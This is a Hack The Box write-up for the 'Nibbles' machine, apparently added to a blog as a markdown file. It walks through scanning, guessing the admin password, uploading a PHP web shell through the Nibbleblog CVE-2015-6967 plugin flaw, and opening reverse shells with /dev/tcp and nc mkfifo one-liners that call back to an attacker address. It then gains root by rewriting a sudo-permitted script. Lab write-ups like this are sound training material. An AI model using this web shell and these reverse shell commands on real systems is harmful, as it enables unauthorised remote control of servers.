@@ -1,0 +1,229 @@
+---
+title: "Nibbles ~ HTB Writeup"
+publishedAt: "2018-07-01"
+summary: "Writeup of the Nibbles HackTheBox machine."
+---
+
+- Creator: [@mrb3n](https://www.hackthebox.eu/home/users/profile/2984)
+- Host: [hackthebox.eu](https://hackthebox.eu)
+
+---
+
+## Owning user
+
+Let's start up with the usual Nmap port scan.
+
+> `~ ❯❯❯ nmap -sC -sV 10.10.10.75`
+
+```bash
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-25 18:52 EEST
+Nmap scan report for 10.10.10.75 (10.10.10.75)
+Host is up (0.067s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; pr
+otocol 2.0)
+| ssh-hostkey:
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds
+```
+
+Looks like we have a webserver. Let's fire up our browser and have a look.
+
+![10.10.10.75](/static/images/nibbles-hack-the-box-writeup/10.10.10.75.png)
+
+Hello to you too! A simple `view-source` reveals an interesting directory:
+
+```html
+<b>Hello world!</b>
+
+
+<!-- /nibbleblog/ directory. Nothing interesting here! -->
+```
+
+Navigating to the new directory, we find an empty blog.
+
+![nibbleblog](/static/images/nibbles-hack-the-box-writeup/nibbleblog.png)
+
+Let's try to `dirb` for any suspicious files within this 'empty' blog.
+
+> `~ ❯❯❯ dirb http://10.10.10.75/nibbleblog/`
+
+```bash
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Jun 25 18:58:57 2018
+URL_BASE: http://10.10.10.75/nibbleblog/
+WORDLIST_FILES: /usr/local/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.10.75/nibbleblog/ ----
+
+
+==> DIRECTORY: http://10.10.10.75/nibbleblog/admin/
++ http://10.10.10.75/nibbleblog/admin.php (CODE:200|SIZE:1401)
+
+==> DIRECTORY: http://10.10.10.75/nibbleblog/content/
++ http://10.10.10.75/nibbleblog/index.php (CODE:200|SIZE:4743)
+
+==> DIRECTORY: http://10.10.10.75/nibbleblog/languages/
+
+==> DIRECTORY: http://10.10.10.75/nibbleblog/plugins/
++ http://10.10.10.75/nibbleblog/README (CODE:200|SIZE:4628)
+
+==> DIRECTORY: http://10.10.10.75/nibbleblog/themes/
+
+-----------------
+END_TIME: Mon Jun 25 19:04:50 2018
+DOWNLOADED: 4612 - FOUND: 3
+```
+
+The `admin.php` page seems interesting; we should have a look.
+
+![admin](/static/images/nibbles-hack-the-box-writeup/admin.png)
+
+A login screen. Let's give it some guessing shots to see if we can get lucky.
+
+After a few tries, we notice that there's some sort of WAF, blacklisting users after consecutive failed authentication attempts.
+
+![blacklist](/static/images/nibbles-hack-the-box-writeup/blacklist.png)
+
+A few minutes later, we were able to retry.
+
+The credentials `admin` for username and `nibbles` for password did the job, saving us from the trouble of bruteforcing our way in (using some dynamic proxy). Of course, it's Hack The Box; the machine's name always comes in handy at some point.
+
+After conducting some research, we come accross a nibbleblog vulnerability: [CVE-2015-6967](https://seclists.org/fulldisclosure/2015/Sep/5). It turns out that we can upload any `php` script as an image in the "My image" plugin section. 
+
+A dead simple php script should do the job:
+
+```php
+<?php
+
+echo shell_exec($_GET['e']);
+```
+
+Once we upload our 'image' onto the bloggin platform, we can navigate to [10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php](http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?e=id) to see that we are now able to execute commands through our url bar!
+
+![id](/static/images/nibbles-hack-the-box-writeup/id.png)
+
+Evidently, we now have 'nibbler' privileges (i.e. user privileges). So, let's pop a reverse shell.
+
+Firstly, we should create a file containing our reverse shell script inside the `/tmp/` directory, where we should logically have the appropriate permissions. 
+
+```bash
+10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?e=/bin/echo "/bin/bash -i %3E%26 /dev/tcp/10.10.15.174/443 0%3E%261" > /tmp/reverse.txt
+```
+
+Subsequently, let's ensure that we have execute permissions to run the temporary file using `chmod 777`.
+
+```bash
+10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?e=/bin/chmod 777 /tmp/reverse.txt
+```
+
+Finally, we can now fire up a listener on our local device using `netcat`  and execute our reverse shell file.
+
+```bash
+10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?e=/bin/bash /tmp/reverse.txt/
+```
+
+We should now have a shell as user "nibbler":
+
+> `root@kali:~/# nc -vlp 443`
+
+```bash
+listening on [any] 443 ...
+connect to [10.10.15.174] from 10.10.10.75 [10.10.10.75] 39002
+bash: cannot set terminal process group (1335): Inappropriate ioctl for device
+bash: no job control in this shell
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 
+```
+
+We can subsequently navigate to the `/home/` directory where we can retrieve our first flag:
+
+> `nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler`
+
+> `nibbler@Nibbles:/home/nibbler/$ cat user.txt`
+
+```bash
+{USER_HASH_GOES_HERE}
+```
+
+## Owning root
+
+Taking a look at the contents of nibbler's home directory, we can also find a zip folder called `personal.zip`. Let's try unzipping it.
+
+> `nibbler@Nibbles:/home/nibbler/$ ls`
+
+```bash
+personal.zip
+user.txt
+```
+
+> `nibbler@Nibbles:/home/nibbler/$ unzip personal.zip`
+
+```bash
+Archive:  personal.zip
+   creating: personal/
+   creating: personal/stuff/
+  inflating: personal/stuff/monitor.sh
+```
+
+The archive inflated a new file called `monitor.sh`. Let's navigate to its directory.
+
+> `nibbler@Nibbles:/home/nibbler/$ cd personal/stuff`
+
+> `nibbler@Nibbles:/home/nibbler/personal/stuff/$ ls -la`
+
+```bash
+total 12
+drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
+drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
+-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
+```
+
+The file contains a bash script called [tecmint_monitor.sh](https://github.com/atarallo/TECMINT_MONITOR/blob/master/tecmint_monitor.sh) which, according to the creator, "monitors linux health"; that's beside the point though. Now, let's modify the contents of the file into a reverse shell script and try to run it as `root`. 
+
+> `nibbler@Nibbles:/home/nibbler/personal/stuff/$ sed -i d monitor.sh`
+
+```bash
+nibbler@Nibbles:/home/nibbler/personal/stuff/$ echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.15.174 7777 > /tmp/f" >> monitor.sh
+```
+
+> `nibbler@Nibbles:/home/nibbler/personal/stuff/$ sudo -u root monitor.sh`
+
+We should make sure to open up a listener on the same port before running the above command and wait to see if we can get a connection.
+
+> `root@kali:~/Desktop# nc -vlp 7777`
+
+```bash
+listening on [any] 7777 ...
+connect to [10.10.15.174] from 10.10.10.75 [10.10.10.75] 49104
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+And there we have it! We now have root priviliges. Let's extract our `root.txt` hash.
+
+```bash
+# cd /root
+# ls
+root.txt
+# cat root.txt
+{ROOT_HASH_GOES_HERE}
+```
+
+I hope you enjoyed this walkthrough! Make sure to stay tuned for more *Hack The Box* writeups coming up soon!
